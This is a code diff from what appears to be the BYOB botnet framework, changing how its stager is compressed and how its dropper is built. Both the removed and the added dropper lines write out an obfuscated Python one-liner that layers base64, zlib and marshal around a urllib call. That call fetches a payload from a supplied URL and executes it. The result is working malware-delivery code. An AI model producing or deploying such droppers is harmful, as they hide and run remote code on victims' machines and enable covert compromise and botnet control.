@@ -360,7 +360,7 @@ def _stager(options, **kwargs):
         util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
-        output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
+        output = generators.compress(stager)
         __load__.set()
         _update(stager, output, task='Compression')
         stager = output
@@ -404,7 +404,7 @@ def _dropper(options, **kwargs):
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
+    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
     with open(name, 'w') as fp:
         fp.write(dropper)
 
